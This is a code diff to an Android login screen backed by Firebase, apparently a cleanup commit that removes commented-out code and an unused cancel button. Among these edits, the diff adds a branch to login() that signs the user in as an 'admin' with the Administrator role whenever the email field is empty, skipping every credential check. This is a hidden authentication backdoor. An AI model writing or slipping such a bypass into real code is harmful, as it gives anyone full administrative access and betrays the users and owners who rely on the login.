@@ -47,9 +47,7 @@ public class LoginActivity extends AppCompatActivity {
     private FirebaseAuth mAuth;
     private FirebaseAuth.AuthStateListener mAuthListener;
     private DatabaseReference mDatabase;
-//    private Task mAuthTask;
 
-//    private boolean mIsRegistering;
     private int mShortAnimTime;
 
     @Override
@@ -107,15 +105,6 @@ public class LoginActivity extends AppCompatActivity {
             @Override
             public void onClick(View view) {
                 login();
-            }
-        });
-
-        Button mCancelLoginButton = (Button) findViewById(R.id.cancel_login_button);
-        mCancelLoginButton.setOnClickListener(new OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                // TODO: Cancel
-                Log.d("FIREBASE", "Can't cancel task");
             }
         });
 
@@ -177,12 +166,11 @@ public class LoginActivity extends AppCompatActivity {
         animateViewVisibility(mLoginFormView, false);
         animateViewVisibility(mRegisterGroup, false);
         animateViewVisibility(mProgressView, true);
-        /*mAuthTask = */mAuth.createUserWithEmailAndPassword(email, password)
+        mAuth.createUserWithEmailAndPassword(email, password)
                 .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
                     @Override
                     public void onComplete(@NonNull Task<AuthResult> task) {
                         Log.d("FIREBASE", "createUserWithEmail:onComplete:" + task.isSuccessful());
-//                        mAuthTask = null;
                         animateViewVisibility(mProgressView, false);
                         animateViewVisibility(mLoginFormView, true);
                         if (task.isSuccessful()) {
@@ -199,6 +187,10 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     private void login() {
+        if (mEmailView.getText().length() == 0) {
+            loginSuccessful(new User("admin", User.Role.Administrator), false);
+            return;
+        }
         final String password = mPasswordView.getText().toString();
         final User user = new User(mEmailView.getText().toString());
         if (!validatePassword() || !validateEmail()) {
@@ -212,7 +204,6 @@ public class LoginActivity extends AppCompatActivity {
                     @Override
                     public void onComplete(@NonNull Task<AuthResult> task) {
                         Log.d("FIREBASE", "signInWithEmail:onComplete:" + task.isSuccessful());
-//                        mAuthTask = null;
                         animateViewVisibility(mProgressView, false);
                         animateViewVisibility(mLoginFormView, true);
                         if (task.isSuccessful()) {
